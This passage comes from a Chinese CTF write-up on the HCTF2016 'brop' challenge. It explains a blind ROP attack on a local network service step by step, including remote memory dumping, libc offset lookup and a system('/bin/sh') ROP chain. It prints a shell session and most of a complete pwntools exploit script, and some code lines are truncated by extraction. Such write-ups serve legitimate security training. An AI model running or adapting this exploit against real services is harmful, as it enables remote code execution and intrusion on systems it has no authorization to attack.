log.info("puts@plt address: 0x%x" % addr)
p.close()
return addr
log.info("bad: 0x%x" % addr)
p.close()
except EOFError as e:
p.close()
log.info("bad: 0x%x" % addr)
except:
log.info("Can't connect")
addr -= 1
这里让 puts 打印出 0x400000 地址处的内容，因为这里通常是程序头的位置（关
闭PIE），且前四个字符为 \x7fELF ，方便进行验证。
[*] puts@plt address: 0x4005e7
成功找到一个地址，它确实调用 puts，打印出了 \x7fELF ，那它真的就是
puts@plt 的地址吗，不一定，看一下呗，反正我们有二进制文件。
882
6.1.1 pwn HCTF2016 brop
gdb-peda$ disassemble /r 0x4005f0
Dump of assembler code for function puts@plt:
0x00000000004005f0 : ff 25 22 0a 20 00 jmp Q
WORD PTR [rip+0x200a22] # 0x601018
0x00000000004005f6 : 68 00 00 00 00 push 0x0
0x00000000004005fb : e9 e0 ff ff ff jmp 0x4005e0
End of assembler dump.
不对呀，puts@plt 明明是在 0x4005f0 ，那么 0x4005e7 是什么鬼。
gdb-peda$ pdisass /r 0x4005e7,0x400600
Dump of assembler code from 0x4005e7 to 0x400600:
0x00000000004005e7: 25 24 0a 20 00 and eax,0x200a24
0x00000000004005ec: 0f 1f 40 00 nop DWORD PTR [rax+0x
0]
0x00000000004005f0 : ff 25 22 0a 20 00
jmp QWORD PTR [rip+0x200a22] # 0x601018
0x00000000004005f6 : 68 00 00 00 00 push 0
x0
0x00000000004005fb : e9 e0 ff ff ff jmp 0
x4005e0
End of assembler dump.
原来是由于反汇编时候的偏移，导致了这个问题，当然了前两句对后面的 puts 语
句并没有什么影响，忽略它，在后面的代码中继续使用 0x4005e7 。
remote dump
有了 puts，有了 gadget，就可以着手 dump 程序了：
883
6.1.1 pwn HCTF2016 brop
def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, sta
rt_addr, end_addr):
pop_rdi = gadgets_addr + 9 # pop rdi; ret
result = ""
while start_addr  %s" % (start_addr,(data
or '').encode('hex')))
result += data
start_addr += len(data)
p.close()
except:
log.info("Can't connect")
return result
我们知道 puts 函数通过 \x00 进行截断，并且会在每一次输出末尾加上换行符
\x0a ，所以有一些特殊情况需要做一些处理，比如单独的 \x00 、 \x0a 等，
首先当然是先去掉末尾 puts 自动加上的 \n ，然后如果 recv 到一个 \n ，说明
内存中是 \x00 ，如果 recv 到一个 \n\n ，说明内存中是
\x0a 。 p.recv(timeout=0.1) 是由于函数本身的设定，如果有 \n\n ，它很
可能在收到第一个 \n 时就返回了，加上参数可以让它全部接收完。
884
6.1.1 pwn HCTF2016 brop
这里选择从 0x400000 dump到 0x401000 ，足够了，你还可以 dump 下 data
段的数据，大概从 0x600000 开始。
puts@got
拿到 dump 下来的文件，使用 Radare2 打开，使用参数 -B 指定程序基地址，然
后反汇编 puts@plt 的位置 0x4005e7 ，当然你要直接反汇编 0x4005f0 也
行：
$ r2 -B 0x400000 code.bin
[0x00400630]> pd 14 @ 0x4005e7
:::: 0x004005e7 25240a2000 and eax, 0x200a24
:::: 0x004005ec 0f1f4000 nop dword [rax]
:::: 0x004005f0 ff25220a2000 jmp qword [0x00601018
] ; [0x601018:8]=-1
:::: 0x004005f6 6800000000 push 0
`==== Writing libc to db/local-e112b79b632f33fce6908f5ffd2f61a5d8
058570.so
-> Writing symbols to db/local-e112b79b632f33fce6908f5ffd2f61a
5d8058570.symbols
-> Writing version info
886
6.1.1 pwn HCTF2016 brop
然后查询（ASLR 并不影响后 12 位的值）：
$ ./find puts 210
/usr/lib/libc-2.26.so (id local-e112b79b632f33fce6908f5ffd2f61a5
d8058570)
$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570
offset___libc_start_main_ret = 0x20f6a
offset_system = 0x0000000000042010
offset_dup2 = 0x00000000000e8100
offset_read = 0x00000000000e7820
offset_write = 0x00000000000e78c0
offset_str_bin_sh = 0x17aff5
$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts
offset_puts = 0x000000000006f210
offset_puts = 0x000000000006f210
offset_system = 0x0000000000042010
offset_str_bin_sh = 0x17aff5
system_addr = (puts_addr - offset_puts) + offset_system
binsh_addr = (puts_addr - offset_puts) + offset_str_bin_sh
# get shell
payload = "A"*buf_size
payload += p64(gadgets_addr + 9) # pop rdi; ret;
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(stop_addr)
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.interactive()
Bingo!!!
887
6.1.1 pwn HCTF2016 brop
$ python2 exp.py
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
from pwn import *
#context.log_level = 'debug'
def get_buffer_size():
for i in range(100):
payload = "A"
payload += "A"*i
buf_size = len(payload) - 1
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.send(payload)
p.recv()
p.close()
log.info("bad: %d" % buf_size)
except EOFError as e:
p.close()
log.info("buffer size: %d" % buf_size)
return buf_size
def get_stop_addr(buf_size):
addr = 0x400000
while True:
sleep(0.1)
addr += 1
payload = "A"*buf_size
payload += p64(addr)
888
6.1.1 pwn HCTF2016 brop
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.recvline()
p.close()
log.info("stop address: 0x%x" % addr)
return addr
except EOFError as e:
p.close()
log.info("bad: 0x%x" % addr)
except:
log.info("Can't connect")
addr -= 1
def get_gadgets_addr(buf_size, stop_addr):
addr = stop_addr
while True:
sleep(0.1)
addr += 1
payload = "A"*buf_size
payload += p64(addr)
payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +
p64(6)
payload += p64(stop_addr)
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.recvline()
p.close()
log.info("find address: 0x%x" % addr)
try: # check
payload = "A"*buf_size
payload += p64(addr)
payload += p64(1) + p64(2) + p64(3) + p64(4) + p
64(5) + p64(6)
p = remote('127.0.0.1', 10001)
p.recvline()
889
6.1.1 pwn HCTF2016 brop
p.sendline(payload)
p.recvline()
p.close()
log.info("bad address: 0x%x" % addr)
except:
p.close()
log.info("gadget address: 0x%x" % addr)
return addr
except EOFError as e:
p.close()
log.info("bad: 0x%x" % addr)
except:
log.info("Can't connect")
addr -= 1
def get_puts_plt(buf_size, stop_addr, gadgets_addr):
pop_rdi = gadgets_addr + 9 # pop rdi; ret;
addr = stop_addr
while True:
sleep(0.1)
addr += 1
payload = "A"*buf_size
payload += p64(pop_rdi)
payload += p64(0x400000)
payload += p64(addr)
payload += p64(stop_addr)
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
if p.recv().startswith("\x7fELF"):
log.info("puts@plt address: 0x%x" % addr)
p.close()
return addr
log.info("bad: 0x%x" % addr)
p.close()
except EOFError as e:
p.close()
log.info("bad: 0x%x" % addr)
890